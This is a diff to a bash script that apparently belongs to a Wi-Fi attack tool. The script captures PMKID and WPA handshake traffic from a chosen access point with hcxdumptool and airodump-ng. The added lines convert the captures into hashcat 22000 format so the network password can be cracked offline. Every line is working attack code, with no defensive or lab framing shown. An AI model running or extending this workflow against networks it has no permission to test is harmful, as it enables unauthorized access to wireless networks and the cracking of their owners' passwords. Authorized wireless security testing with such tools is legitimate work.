@@ -58,6 +58,11 @@ if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     timeout --foreground 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" || true
     rm -f "$FILTER_FILE"
 
+    # Convert pcapng → hashcat 22000 format (PMKID + EAPOL)
+    if [[ -f "${OUTPUT_BASE}_hcxdump.pcapng" ]]; then
+        hcxpcapngtool "${OUTPUT_BASE}_hcxdump.pcapng" -o "${OUTPUT_BASE}_pmkid.hc22000" 2>/dev/null || true
+    fi
+
     # Phase 2: Handshake Capture
     timeout --foreground "$CAPTURE_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" &
     AIRODUMP_PID=$!
@@ -85,6 +90,11 @@ else
         echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"
         timeout 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" > /dev/null 2>&1 || true
         rm -f "$FILTER_FILE"
+
+        # Convert pcapng → hashcat 22000 format
+        if [[ -f "${OUTPUT_BASE}_hcxdump.pcapng" ]]; then
+            hcxpcapngtool "${OUTPUT_BASE}_hcxdump.pcapng" -o "${OUTPUT_BASE}_pmkid.hc22000" > /dev/null 2>&1 || true
+        fi
 
         airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
         AIRODUMP_PID=$!
